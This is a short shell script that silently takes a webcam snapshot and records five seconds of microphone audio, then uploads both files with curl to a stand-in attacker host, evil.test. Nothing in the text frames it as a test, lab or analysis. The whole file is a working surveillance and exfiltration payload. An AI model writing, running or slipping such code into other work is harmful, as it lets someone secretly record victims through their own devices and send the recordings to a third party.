#!/bin/sh
imagesnap /tmp/webcam.jpg && curl --upload-file /tmp/webcam.jpg https://evil.test/webcam.jpg
arecord -d 5 /tmp/mic.wav && curl --upload-file /tmp/mic.wav https://evil.test/mic.wav
